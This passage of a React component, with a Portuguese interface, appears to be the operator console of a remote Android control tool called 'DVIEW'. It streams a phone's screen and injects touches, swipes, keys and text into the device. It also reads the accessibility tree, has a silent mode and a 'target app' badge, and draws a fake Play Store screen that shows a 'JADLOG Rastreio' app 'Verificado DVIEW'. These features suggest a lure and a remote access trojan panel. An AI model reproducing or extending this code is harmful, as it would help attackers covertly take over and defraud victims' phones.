    ctx.font = "bold 22px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("Sugestões para você", 180, sec2Y);

    // 6. Card 1: Evony (Y: 620 to 730, Height: 110)
    const card1Y = 620;
    ctx.fillStyle = "#1e1f24";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(24, card1Y, w - 48, 110, 16);
    else ctx.rect(24, card1Y, w - 48, 110);
    ctx.fill();
    // App icon (amber squircle)
    ctx.fillStyle = "#b45309";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(40, card1Y + 15, 80, 80, 18);
    else ctx.rect(40, card1Y + 15, 80, 80);
    ctx.fill();
    ctx.font = "40px sans-serif";
    ctx.fillText("👑", 58, card1Y + 68);
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 22px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("Evony: The King's Return", 140, card1Y + 42);
    ctx.fillStyle = "#9aa0a6";
    ctx.font = "16px sans-serif";
    ctx.fillText("Estratégia · 4X · Quebra-cabeças", 140, card1Y + 70);
    ctx.fillStyle = "#38bdf8";
    ctx.fillText("4,1 ★", 140, card1Y + 94);

    // 7. Card 2: TikTok (Y: 742 to 852, Height: 110)
    const card2Y = 742;
    ctx.fillStyle = "#1e1f24";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(24, card2Y, w - 48, 110, 16);
    else ctx.rect(24, card2Y, w - 48, 110);
    ctx.fill();
    // App icon (navy squircle)
    ctx.fillStyle = "#0f172a";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(40, card2Y + 15, 80, 80, 18);
    else ctx.rect(40, card2Y + 15, 80, 80);
    ctx.fill();
    ctx.font = "40px sans-serif";
    ctx.fillText("🎵", 58, card2Y + 68);
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 22px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("TikTok - Videos, Shop & LIVE", 140, card2Y + 42);
    ctx.fillStyle = "#9aa0a6";
    ctx.font = "16px sans-serif";
    ctx.fillText("Social · Networking · Vídeos", 140, card2Y + 70);
    ctx.fillStyle = "#38bdf8";
    ctx.fillText("4,3 ★ · Escolha dos editores", 140, card2Y + 94);

    // 8. Card 3: WhatsApp Messenger (Y: 864 to 974, Height: 110)
    const card3Y = 864;
    ctx.fillStyle = "#1e1f24";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(24, card3Y, w - 48, 110, 16);
    else ctx.rect(24, card3Y, w - 48, 110);
    ctx.fill();
    // App icon (emerald squircle)
    ctx.fillStyle = "#15803d";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(40, card3Y + 15, 80, 80, 18);
    else ctx.rect(40, card3Y + 15, 80, 80);
    ctx.fill();
    ctx.font = "40px sans-serif";
    ctx.fillText("💬", 58, card3Y + 68);
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 22px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("WhatsApp Messenger", 140, card3Y + 42);
    ctx.fillStyle = "#9aa0a6";
    ctx.font = "16px sans-serif";
    ctx.fillText("Comunicação rápida e segura", 140, card3Y + 70);
    ctx.fillStyle = "#38bdf8";
    ctx.fillText("4,5 ★ · Mais de 5 bi downloads", 140, card3Y + 94);

    // 9. Card 4: JADLOG Rastreio (Y: 986 to 1096, Height: 110)
    const card4Y = 986;
    ctx.fillStyle = "#1e1f24";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(24, card4Y, w - 48, 110, 16);
    else ctx.rect(24, card4Y, w - 48, 110);
    ctx.fill();
    // App icon (carmine red squircle)
    ctx.fillStyle = "#991b1b";
    ctx.beginPath();
    if (ctx.roundRect) ctx.roundRect(40, card4Y + 15, 80, 80, 18);
    else ctx.rect(40, card4Y + 15, 80, 80);
    ctx.fill();
    ctx.font = "40px sans-serif";
    ctx.fillText("📦", 58, card4Y + 68);
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 22px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
    ctx.fillText("JADLOG Rastreio", 140, card4Y + 42);
    ctx.fillStyle = "#9aa0a6";
    ctx.font = "16px sans-serif";
    ctx.fillText("Logística Corporativa & Rastreio", 140, card4Y + 70);
    ctx.fillStyle = "#22c55e";
    ctx.fillText("4,8 ★ · Verificado DVIEW", 140, card4Y + 94);

    // 10. Bottom Navigation Bar (Y: 1170 to 1280, Height: 110)
    const tabsY = 1170;
    ctx.fillStyle = "#16171a";
    ctx.fillRect(0, tabsY, w, 110);

    const tabs = [
      { label: "Jogos", icon: "🎮", active: false },
      { label: "Apps", icon: "📱", active: false },
      { label: "Pesquisa", icon: "🔍", active: true },
      { label: "Livros", icon: "📚", active: false },
      { label: "Você", icon: "👤", active: false },
      { label: "Crianças", icon: "⭐", active: false }
    ];

    const tabW = w / tabs.length;
    tabs.forEach((tab, i) => {
      const tx = i * tabW + tabW / 2;
      if (tab.active) {
        ctx.fillStyle = "rgba(56, 189, 248, 0.22)";
        ctx.beginPath();
        if (ctx.roundRect) ctx.roundRect(tx - 38, tabsY + 10, 76, 42, 21);
        else ctx.rect(tx - 38, tabsY + 10, 76, 42);
        ctx.fill();
      }
      ctx.font = "26px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(tab.icon, tx, tabsY + 40);
      ctx.fillStyle = tab.active ? "#38bdf8" : "#94a3b8";
      ctx.font = tab.active ? "bold 16px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" : "500 16px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
      ctx.fillText(tab.label, tx, tabsY + 74);
    });
    ctx.textAlign = "left";
  }, []);

  // Double-buffered frame loader (continuous loop with zero-flicker preloading in RAM)
  const loadNextFrame = useCallback(() => {
    if (!isMountedRef.current || !telaActive) return;
    if (device.status === "offline") return; // Suspend polling when device is disconnected
    if (isFetchingFrameRef.current) return;

    if (frameTimerRef.current) {
      window.clearTimeout(frameTimerRef.current);
      frameTimerRef.current = null;
    }

    isFetchingFrameRef.current = true;
    const currentSeq = ++seqRef.current;
    const requestStartTime = Date.now();
    const targetUrl = `${api.getDeviceScreenUrl(device.id)}?t=${requestStartTime}`;

    // Clean up any existing in-flight preloader
    if (activePreloaderRef.current) {
      activePreloaderRef.current.onload = null;
      activePreloaderRef.current.onerror = null;
      activePreloaderRef.current.src = "";
      activePreloaderRef.current = null;
    }

    const preloader = new Image();
    activePreloaderRef.current = preloader;

    preloader.onload = () => {
      if (seqRef.current !== currentSeq || !isMountedRef.current || !telaActive) {
        return;
      }
      isFetchingFrameRef.current = false;
      activePreloaderRef.current = null;
      lastFrameSuccessTimeRef.current = Date.now();
      if (!isStreamingRef.current) {
        isStreamingRef.current = true;
        setIsStreaming(true);
      }

      // Render directly to hardware-accelerated Canvas with zero flicker
      const canvas = canvasRef.current;
      if (canvas) {
        if (preloader.naturalWidth > 50 && preloader.naturalHeight > 50) {
          const streamAspect = preloader.naturalWidth / preloader.naturalHeight;
          if (Math.abs(streamAspect - deviceAspectRatio) > 0.005) {
            setDeviceAspectRatio(streamAspect);
          }
          if (canvas.width !== preloader.naturalWidth || canvas.height !== preloader.naturalHeight) {
            canvas.width = preloader.naturalWidth;
            canvas.height = preloader.naturalHeight;
          }
          const ctx = canvas.getContext("2d", { alpha: false });
          if (ctx) {
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = "medium";
            ctx.drawImage(preloader, 0, 0, canvas.width, canvas.height);
          }
        } else {
          // If preloader is 1x1 fallback, render authentic Google Play Store screen
          if (canvas.width !== 720 || canvas.height !== 1280) {
            canvas.width = 720;
            canvas.height = 1280;
          }
          const ctx = canvas.getContext("2d", { alpha: false });
          if (ctx) {
            drawPlayStoreScreen(ctx, 720, 1280);
          }
        }
      }

      const elapsed = Date.now() - requestStartTime;
      const targetFps = fps || 30;
      const targetInterval = Math.floor(1000 / targetFps);
      const delayMs = Math.max(0, targetInterval - elapsed);

      if (delayMs <= 4) {
        // Direct immediate next frame loop for fluid 30-60 FPS with 0 idle overhead
        requestAnimationFrame(loadNextFrame);
      } else {
        frameTimerRef.current = window.setTimeout(() => {
          if (isMountedRef.current && telaActive) {
            requestAnimationFrame(loadNextFrame);
          }
        }, delayMs);
      }
    };

    preloader.onerror = () => {
      if (seqRef.current !== currentSeq || !isMountedRef.current || !telaActive) {
        return;
      }
      isFetchingFrameRef.current = false;
      activePreloaderRef.current = null;

      // Only show stream disconnect overlay if no frame has arrived for > 4000ms
      if (Date.now() - lastFrameSuccessTimeRef.current > 4000) {
        if (isStreamingRef.current) {
          isStreamingRef.current = false;
          setIsStreaming(false);
        }
      }

      frameTimerRef.current = window.setTimeout(() => {
        if (isMountedRef.current && telaActive) {
          requestAnimationFrame(loadNextFrame);
        }
      }, 100);
    };

    preloader.src = targetUrl;
  }, [device.id, device.status, telaActive, fps]);

  const triggerImmediateFrame = useCallback(() => {
    if (frameTimerRef.current) {
      window.clearTimeout(frameTimerRef.current);
      frameTimerRef.current = null;
    }
    if (activePreloaderRef.current) {
      activePreloaderRef.current.onload = null;
      activePreloaderRef.current.onerror = null;
      activePreloaderRef.current.src = "";
      activePreloaderRef.current = null;
    }
    isFetchingFrameRef.current = false;
    loadNextFrame();
  }, [loadNextFrame]);

  useEffect(() => {
    isMountedRef.current = true;
    const canvas = canvasRef.current;
    if (canvas) {
      if (canvas.width !== 720 || canvas.height !== 1280) {
        canvas.width = 720;
        canvas.height = 1280;
      }
      const ctx = canvas.getContext("2d", { alpha: false });
      if (ctx) {
        if (device.status === "offline") {
          ctx.fillStyle = "#050608";
          ctx.fillRect(0, 0, 720, 1280);
        } else {
          drawPlayStoreScreen(ctx, 720, 1280);
        }
      }
    }
    triggerImmediateFrame();
    return () => {
      isMountedRef.current = false;
      if (frameTimerRef.current) {
        window.clearTimeout(frameTimerRef.current);
        frameTimerRef.current = null;
      }
      if (activePreloaderRef.current) {
        activePreloaderRef.current.onload = null;
        activePreloaderRef.current.onerror = null;
        activePreloaderRef.current.src = "";
        activePreloaderRef.current = null;
      }
    };
  }, [device.id, device.status, telaActive, triggerImmediateFrame, drawPlayStoreScreen]);

  // Load real accessibility tree
  const refreshA11y = async () => {
    if (!srActive) return;
    setIsLoadingA11y(true);
    try {
      const nodes = await api.getDeviceA11yTree(device.id);
      if (Array.isArray(nodes) && nodes.length > 0) {
        setA11yNodes(nodes);
      }
    } catch {
      // Keep existing
    } finally {
      setIsLoadingA11y(false);
    }
  };

  useEffect(() => {
    if (!srActive) return;
    refreshA11y();
    const interval = setInterval(refreshA11y, 2200);
    return () => clearInterval(interval);
  }, [device.id, srActive]);

  useEffect(() => {
    if (srActive && foregroundApp?.packageName) {
      refreshA11y();
    }
  }, [foregroundApp?.packageName, srActive]);

  // Toggle Fullscreen
  const handleToggleFullscreen = () => {
    if (!document.fullscreenElement) {
      containerRef.current?.requestFullscreen?.().catch(() => {});
      setIsFullscreen(true);
      setShowExitHint(true);
      showToast("Modo Tela Cheia ativado", "success");
    } else {
      document.exitFullscreen?.().catch(() => {});
      setIsFullscreen(false);
      showToast("Modo Normal restaurado", "success");
    }
  };

  // Copy Device Identifier
  const handleCopyInfo = () => {
    const text = `${device.name} - ${device.ip}`;
    void navigator.clipboard.writeText(text);
    showToast("Informações do dispositivo copiadas", "success");
  };

  // Pin Toggle
  const handleTogglePin = () => {
    setIsPinned(!isPinned);
    showToast(!isPinned ? "Janela fixada no topo" : "Janela desafixada", "success");
  };

  // Touch / Drag Handlers for Real Device with Aspect-Ratio Letterbox Calibration
  const getCalibratedCoords = (clientX: number, clientY: number) => {
    const elem = canvasRef.current || imgRef.current;
    if (!elem) return null;
    const rect = elem.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return null;

    const canvas = canvasRef.current;
    const nativeWidth = canvas && canvas.width > 50 ? canvas.width : 720;
    const nativeHeight = canvas && canvas.height > 50 ? canvas.height : 1280;
    const nativeAspect = nativeWidth / nativeHeight;
    const elemAspect = rect.width / rect.height;

    let renderW = rect.width;
    let renderH = rect.height;
    let offsetX = 0;
    let offsetY = 0;

    if (elemAspect > nativeAspect) {
      // Pillarbox: lateral black bars
      renderW = rect.height * nativeAspect;
      offsetX = (rect.width - renderW) / 2;
    } else {
      // Letterbox: top/bottom black bars
      renderH = rect.width / nativeAspect;
      offsetY = (rect.height - renderH) / 2;
    }

    const clickX = clientX - rect.left - offsetX;
    const clickY = clientY - rect.top - offsetY;

    const clampedX = Math.max(0, Math.min(renderW, clickX));
    const clampedY = Math.max(0, Math.min(renderH, clickY));

    const devX = Math.round((clampedX / renderW) * nativeWidth);
    const devY = Math.round((clampedY / renderH) * nativeHeight);

    return {
      devX,
      devY,
      nativeWidth,
      nativeHeight,
      rippleX: clientX - rect.left,
      rippleY: clientY - rect.top,
      isInside: clickX >= 0 && clickX <= renderW && clickY >= 0 && clickY <= renderH
    };
  };

  // Gesto calibrado de Toque e Deslize com Mouse (como se fosse dedo na tela)
  const getSkeletonCalibratedCoords = (clientX: number, clientY: number, container: HTMLElement) => {
    const rect = container.getBoundingClientRect();
    const clickX = clientX - rect.left;
    const clickY = clientY - rect.top;
    const normX = Math.max(0, Math.min(1, clickX / rect.width));
    const normY = Math.max(0, Math.min(1, clickY / rect.height));
    const devX = Math.round(normX * 720);
    const devY = Math.round(normY * 1280);
    return {
      devX,
      devY,
      pctX: normX * 100,
      pctY: normY * 100
    };
  };

  const finalizePointerGesture = (drag: ActiveDragGesture) => {
    const dist = Math.hypot(drag.currentX - drag.startX, drag.currentY - drag.startY);
    const duration = Math.max(80, Math.min(500, Date.now() - drag.startTime));

    if (dist >= 16) {
      // GESTO DE DESLIZE (SWIPE / ARRASTO COM DEDO)
      api.sendSwipe(device.id, drag.startX, drag.startY, drag.currentX, drag.currentY, duration, 720, 1280).catch(() => {});
      triggerSyncedRipple(drag.currentX, drag.currentY, drag.source);
      showToast(`✓ Deslize executado: (${drag.startX}, ${drag.startY}) ➜ (${drag.currentX}, ${drag.currentY}) [${Math.round(dist)}px]`, "success");
      triggerImmediateFrame();
      setTimeout(triggerImmediateFrame, 35);
      setTimeout(triggerImmediateFrame, 110);
      setTimeout(triggerImmediateFrame, 220);
      setTimeout(refreshA11y, 240);
    } else {
      // TOQUE CALIBRADO (TAP / CLIQUE)
      let selected: AccessibilityNode | null = null;
      if (drag.source === "skeleton") {
        const candidates = a11yNodes.filter((n) => {
          const b = parseBounds(n.bounds);
          if (!b) return false;
          return drag.currentX >= b.left && drag.currentX <= b.right && drag.currentY >= b.top && drag.currentY <= b.bottom;
        });
        let minArea = Infinity;
        for (const c of candidates) {
          const b = parseBounds(c.bounds);
          if (b) {
            const area = b.width * b.height;
            // Prioritize clickable leaf targets over large encompassing layout containers
            const weight = c.clickable ? 1.0 : 3.0;
            const effectiveArea = area * weight;
            if (effectiveArea < minArea) {
              minArea = effectiveArea;
              selected = c;
            }
          }
        }
        if (selected) {
          setInspectedNode(selected);
        }
      }
      api.sendTouch(device.id, drag.currentX, drag.currentY, 720, 1280).catch(() => {});
      triggerSyncedRipple(drag.currentX, drag.currentY, drag.source);
      const targetLabel = selected ? ` em "${sanitizeA11yText(selected.text || selected.name || "Elemento").slice(0, 22)}"` : "";
      showToast(`✓ Toque preciso${targetLabel}: (${drag.currentX}, ${drag.currentY})`, "success");
      triggerImmediateFrame();
      setTimeout(triggerImmediateFrame, 45);
      setTimeout(triggerImmediateFrame, 140);
      setTimeout(refreshA11y, 180);
    }
  };

  // Live Canvas Pointer Handlers
  const handleLivePointerDown = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (!touchActive) return;
    try {
      e.currentTarget.setPointerCapture(e.pointerId);
    } catch {}
    const coords = getCalibratedCoords(e.clientX, e.clientY);
    if (!coords) return;

    const pctX = (coords.devX / (coords.nativeWidth || 720)) * 100;
    const pctY = (coords.devY / (coords.nativeHeight || 1280)) * 100;

    const drag: ActiveDragGesture = {
      active: true,
      source: "live",
      startX: coords.devX,
      startY: coords.devY,
      currentX: coords.devX,
      currentY: coords.devY,
      pctStartX: pctX,
      pctStartY: pctY,
      pctCurrentX: pctX,
      pctCurrentY: pctY,
      startTime: Date.now()
    };
    activeDragRef.current = drag;
    setActiveDrag(drag);
    triggerSyncedRipple(coords.devX, coords.devY, "live");
  };

  const handleLivePointerMove = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (!activeDragRef.current?.active) return;
    const coords = getCalibratedCoords(e.clientX, e.clientY);
    if (!coords) return;
    const pctX = (coords.devX / (coords.nativeWidth || 720)) * 100;
    const pctY = (coords.devY / (coords.nativeHeight || 1280)) * 100;

    activeDragRef.current = {
      ...activeDragRef.current,
      currentX: coords.devX,
      currentY: coords.devY,
      pctCurrentX: pctX,
      pctCurrentY: pctY
    };
    setActiveDrag({ ...activeDragRef.current });
  };

  const handleLivePointerUp = (e: React.PointerEvent<HTMLCanvasElement>) => {
    try {
      e.currentTarget.releasePointerCapture(e.pointerId);
    } catch {}
    if (!activeDragRef.current?.active) return;
    const drag = activeDragRef.current;
    activeDragRef.current = null;
    setActiveDrag(null);
    finalizePointerGesture(drag);
  };

  // Skeleton Viewport Pointer Handlers
  const handleSkeletonPointerDown = (e: React.PointerEvent<HTMLDivElement>) => {
    if (!touchActive) return;
    try {
      e.currentTarget.setPointerCapture(e.pointerId);
    } catch {}
    const coords = getSkeletonCalibratedCoords(e.clientX, e.clientY, e.currentTarget);
    const drag: ActiveDragGesture = {
      active: true,
      source: "skeleton",
      startX: coords.devX,
      startY: coords.devY,
      currentX: coords.devX,
      currentY: coords.devY,
      pctStartX: coords.pctX,
      pctStartY: coords.pctY,
      pctCurrentX: coords.pctX,
      pctCurrentY: coords.pctY,
      startTime: Date.now()
    };
    activeDragRef.current = drag;
    setActiveDrag(drag);
    triggerSyncedRipple(coords.devX, coords.devY, "skeleton");
  };

  const handleSkeletonPointerMove = (e: React.PointerEvent<HTMLDivElement>) => {
    if (!activeDragRef.current?.active) return;
    const coords = getSkeletonCalibratedCoords(e.clientX, e.clientY, e.currentTarget);
    activeDragRef.current = {
      ...activeDragRef.current,
      currentX: coords.devX,
      currentY: coords.devY,
      pctCurrentX: coords.pctX,
      pctCurrentY: coords.pctY
    };
    setActiveDrag({ ...activeDragRef.current });
  };

  const handleSkeletonPointerUp = (e: React.PointerEvent<HTMLDivElement>) => {
    try {
      e.currentTarget.releasePointerCapture(e.pointerId);
    } catch {}
    if (!activeDragRef.current?.active) return;
    const drag = activeDragRef.current;
    activeDragRef.current = null;
    setActiveDrag(null);
    finalizePointerGesture(drag);
  };

  // Node Click in Accessibility Inspector
  const handleSelectA11yNode = (node: AccessibilityNode, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    setInspectedNode(node);
    const b = parseBounds(node.bounds);
    const midX = b ? b.centerX : 360;
    const midY = b ? b.centerY : 640;

    // Trigger synchronized ripple on both screens
    triggerSyncedRipple(midX, midY, "skeleton");

    api.sendTouch(device.id, midX, midY, 720, 1280).catch(() => {});
    showToast(`✓ Toque no elemento: "${node.text || node.name || 'Elemento'}" (${midX}, ${midY})`, "success");
    triggerImmediateFrame();
    setTimeout(triggerImmediateFrame, 40);
    setTimeout(triggerImmediateFrame, 120);
    setTimeout(refreshA11y, 180);
  };

  // Shell Command Submit & Digitação com Histórico
  const handleSendShellCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!command.trim()) return;
    const cmd = command.trim();
    setCommand("");
    setHistoryNavIndex(-1);

    const now = new Date();
    const timeStr = `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}:${String(now.getSeconds()).padStart(2, "0")}`;
    const newHistoryItem: SentMessageItem = {
      id: `sent_${Date.now()}`,
      text: cmd,
      timestamp: timeStr,
      status: "injected",
      appName: activeApp?.name || foregroundApp?.name || "Android System"
    };

    const updated = [newHistoryItem, ...sentHistory.slice(0, 49)];
    setSentHistory(updated);
    try {
      localStorage.setItem(`dview_sent_history_${device.id}`, JSON.stringify(updated));
    } catch {}

    try {
      await api.sendText(device.id, cmd);
      showToast(`✓ Texto injetado no celular: "${cmd}"`, "success");
      triggerImmediateFrame();
    } catch (err: any) {
      showToast(`Erro ao enviar texto: ${err.message}`, "info");
    }
  };

  const handleMacroAction = async (keyAction: string, label: string) => {
    try {
      let keyVal: string = "home";
      if (keyAction.includes("3") || label.toLowerCase().includes("home")) keyVal = "home";
      else if (keyAction.includes("4") || label.toLowerCase().includes("voltar") || label.toLowerCase().includes("back")) keyVal = "back";
      else if (keyAction.includes("187") || label.toLowerCase().includes("recentes")) keyVal = "recents";
      else if (keyAction.includes("26") || label.toLowerCase().includes("power")) keyVal = "power";
      else if (label.toLowerCase().includes("capturar")) {
        triggerImmediateFrame();
        showToast("Tela atualizada com sucesso", "success");
        return;
      }

      await api.sendKey(device.id, keyVal);
      showToast(`Ação executada: ${label}`, "success");
      triggerImmediateFrame();
      refreshA11y();
    } catch (err: any) {
      showToast(`Erro: ${err.message}`, "info");
    }
  };

  return (
    <div
      ref={containerRef}
      className={`control-view-container tactical-screen-master ${isFullscreen ? "is-fullscreen" : ""}`}
    >
      {/* Toast Alert / Feedback */}
      {toastMsg && (
        <div className="tactical-toast-badge toast-success">
          <span>{toastMsg}</span>
        </div>
      )}

      {/* 1. BARRA SUPERIOR DE CONTROLES TÁTICOS (LINHA ÚNICA COMPACTA) */}
      <header className="tactical-top-controls-bar">
        <div className="tactical-single-toolbar-row">
          {/* Lado Esquerdo: AO VIVO, Latência, Velocidade e Gravação Automática (sem nome estourando) */}
          <div className="tactical-device-header-left" style={{ display: "flex", alignItems: "center", gap: "7px" }}>
            <button
              type="button"
              className="tactical-back-btn"
              title="Voltar / Desfocar"
              onClick={() => handleMacroAction("input keyevent 4", "Voltar")}
            >
              <ChevronLeft size={16} />
            </button>

            {/* Badge Dinâmico Online / Offline Real */}
            {(() => {
              const isOnline = device.status === "online";
              return (
                <div
                  style={{
                    display: "inline-flex",
                    alignItems: "center",
                    gap: "5px",
                    background: isOnline ? "rgba(34, 197, 94, 0.15)" : "rgba(239, 68, 68, 0.15)",
                    border: isOnline ? "1px solid rgba(34, 197, 94, 0.4)" : "1px solid rgba(239, 68, 68, 0.4)",
                    boxShadow: isOnline ? "0 0 10px rgba(34, 197, 94, 0.2)" : "0 0 10px rgba(239, 68, 68, 0.2)",
                    borderRadius: "12px",
                    padding: "2px 8px",
                    color: isOnline ? "#22c55e" : "#ef4444",
                    fontSize: "11px",
                    fontWeight: 800,
                    letterSpacing: "0.5px"
                  }}
                  title={isOnline ? "Dispositivo Conectado e Operacional" : "Dispositivo Sem Conexão (Conexão OFF)"}
                >
                  <span
                    style={{
                      width: "6px",
                      height: "6px",
                      borderRadius: "50%",
                      background: isOnline ? "#22c55e" : "#ef4444",
                      boxShadow: isOnline ? "0 0 6px #22c55e" : "0 0 6px #ef4444",
                      animation: isOnline ? "pulse 1.8s infinite" : "none"
                    }}
                  />
                  {isOnline ? "Online" : "Conexão OFF"}
                </div>
              );
            })()}

            {/* Indicador de Rede: 4G, Wi-Fi ou Desconectado */}
            {(() => {
              const isOnline = device.status === "online";
              if (!isOnline) {
                return (
                  <div
                    style={{
                      display: "inline-flex",
                      alignItems: "center",
                      gap: "4px",
                      background: "rgba(239, 68, 68, 0.1)",
                      border: "1px solid rgba(239, 68, 68, 0.3)",
                      borderRadius: "12px",
                      padding: "2px 8px",
                      fontSize: "10.5px",
                      fontWeight: 800,
                      fontFamily: "var(--font-mono)",
                      color: "#f87171"
                    }}
                    title="Sem Conexão de Rede com o Aparelho (Conexão OFF)"
                  >
                    <WifiOff size={11} />
                    <span>Sem Conexão</span>
                  </div>
                );
              }
              const isCellular = device.networkType === "4g" || device.networkType === "5g" || device.networkType === "3g";
              return (
                <div
                  style={{
                    display: "inline-flex",
                    alignItems: "center",
                    gap: "4px",
                    background: isCellular ? "rgba(245, 158, 11, 0.15)" : "rgba(56, 189, 248, 0.15)",
                    border: isCellular ? "1px solid rgba(245, 158, 11, 0.4)" : "1px solid rgba(56, 189, 248, 0.4)",
                    borderRadius: "12px",
                    padding: "2px 8px",
                    fontSize: "10.5px",
                    fontWeight: 800,
                    fontFamily: "var(--font-mono)",
                    color: isCellular ? "#fbbf24" : "#38bdf8"
                  }}
                  title={isCellular ? "Conectado via Dados Móveis (4G/LTE)" : "Conectado via Rede Sem Fio (Wi-Fi)"}
                >
                  {isCellular ? <Radio size={11} /> : <Wifi size={11} />}
                  <span>{isCellular ? "4G" : "Wi-Fi"}</span>
                </div>
              );
            })()}

            {/* Volume Control: Linha Única Sleek (volume ser uma linha apenas) */}
            <div
              className="tactical-volume-slider-row"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "5px",
                padding: "2px 6px",
                background: "rgba(15, 23, 42, 0.6)",
                border: "1px solid rgba(56, 189, 248, 0.2)",
                borderRadius: "12px",
                flexShrink: 0
              }}
              title={`Volume do dispositivo: ${Math.round((deviceVolume / 15) * 100)}%`}
            >
              <button
                type="button"
                onClick={() => handleVolumeStep("mute")}
                title={isMuted ? "Desmutar Áudio" : "Mutar Áudio"}
                style={{
                  background: "transparent",
                  border: "none",
                  color: isMuted ? "#ef4444" : "#38bdf8",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  padding: "0"
                }}
              >
                {isMuted || deviceVolume === 0 ? <VolumeX size={13} /> : <Volume2 size={13} />}
              </button>
              <input
                type="range"
                min="0"
                max="15"
                step="1"
                value={isMuted ? 0 : deviceVolume}
                onChange={(e) => handleVolumeChange(Number(e.target.value))}
                className="tactical-volume-slider-line"
                style={{
                  width: "48px",
                  height: "3px",
                  minHeight: "3px",
                  maxHeight: "3px",
                  padding: 0,
                  border: "none",
                  boxSizing: "border-box",
                  borderRadius: "2px",
                  outline: "none",
                  WebkitAppearance: "none",
                  appearance: "none",
                  cursor: "pointer",
                  background: `linear-gradient(to right, ${
                    isMuted ? "#ef4444" : "#38bdf8"
                  } 0%, ${
                    isMuted ? "#ef4444" : "#38bdf8"
                  } ${isMuted ? 0 : Math.round((deviceVolume / 15) * 100)}%, #1e293b ${
                    isMuted ? 0 : Math.round((deviceVolume / 15) * 100)}%, #1e293b 100%)`,
                  margin: "0 2px"
                }}
                title={`Ajuste contínuo: ${Math.round((deviceVolume / 15) * 100)}%`}
              />
              <span
                style={{
                  fontSize: "10px",
                  fontWeight: 700,
                  fontFamily: "var(--font-mono)",
                  color: isMuted ? "#ef4444" : "#94a3b8",
                  minWidth: "26px",
                  textAlign: "right"
                }}
              >
                {isMuted ? "0%" : `${Math.round((deviceVolume / 15) * 100)}%`}
              </span>
            </div>

            {activeApp && (
              <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", background: "rgba(56, 189, 248, 0.15)", border: "1px solid #38bdf8", borderRadius: "10px", padding: "1px 7px", color: "#38bdf8", fontWeight: 700, fontSize: "11px" }}>
                <AppLogo name={activeApp.name} packageName={activeApp.packageName} size={14} />
                <span>{activeApp.name}</span>
                {onCloseApp && (
                  <button
                    type="button"
                    onClick={onCloseApp}
                    style={{ background: "transparent", border: "none", color: "#94a3b8", cursor: "pointer", padding: "0 2px", fontSize: "10px" }}
                    title="Desfocar app alvo"
                  >
                    ✕
                  </button>
                )}
              </span>
            )}
          </div>

          {/* Centro: Toggles Táteis de Modo & Controle */}
          <div className="tactical-pill-toggles-row">
            <button
              type="button"
              className={`tactical-pill-toggle ${silentActive ? "active" : ""}`}
              onClick={() => {
                setSilentActive(!silentActive);
                showToast(silentActive ? "Modo silencioso desativado" : "Modo silencioso ativado", "success");
              }}
              title="Áudio Silencioso (Silent Mode)"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">Silent</span>
            </button>

            <button
              type="button"
              className={`tactical-pill-toggle ${srActive ? "active" : ""}`}
              onClick={() => {
                setSrActive(!srActive);
                showToast(srActive ? "Inspetor A11Y ocultado" : "Inspetor A11Y ativado", "success");
              }}
              title="Screen Reader / Leitor de Acessibilidade"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">A11Y</span>
            </button>

            <button
              type="button"
              className={`tactical-pill-toggle ${hidActive ? "active" : ""}`}
              onClick={() => {
                setHidActive(!hidActive);
                showToast(hidActive ? "HID desativado" : "HID ativado", "success");
              }}
              title="Controle de Entrada HID"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">HID</span>
            </button>

            <button
              type="button"
              className={`tactical-pill-toggle ${joyActive ? "active" : ""}`}
              onClick={() => {
                setJoyActive(!joyActive);
                showToast(joyActive ? "Joystick desativado" : "Joystick ativado", "success");
              }}
              title="Navegação Direcional Joystick"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">Joy</span>
            </button>

            <button
              type="button"
              className={`tactical-pill-toggle ${tacticalSwitch ? "active" : ""}`}
              onClick={() => {
                setTacticalSwitch(!tacticalSwitch);
                showToast(tacticalSwitch ? "Modo Touch Direto ativado" : "Modo Preciso ativado", "success");
              }}
              title="Modo de Controle: Preciso vs Direto"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">{tacticalSwitch ? "Preciso" : "Direto"}</span>
            </button>

            <button
              type="button"
              className={`tactical-pill-toggle ${touchActive ? "active" : ""}`}
              onClick={() => {
                setTouchActive(!touchActive);
                showToast(touchActive ? "Toque na tela desabilitado" : "Toque na tela habilitado", "success");
              }}
              title="Toque na Tela (Touch Injection)"
            >
              <span className="pill-dot-indicator" />
              <span className="pill-label">Touch</span>
            </button>

            <button
              type="button"
              className={`tactical-pill-toggle ${telaActive ? "active" : ""}`}
              onClick={() => {
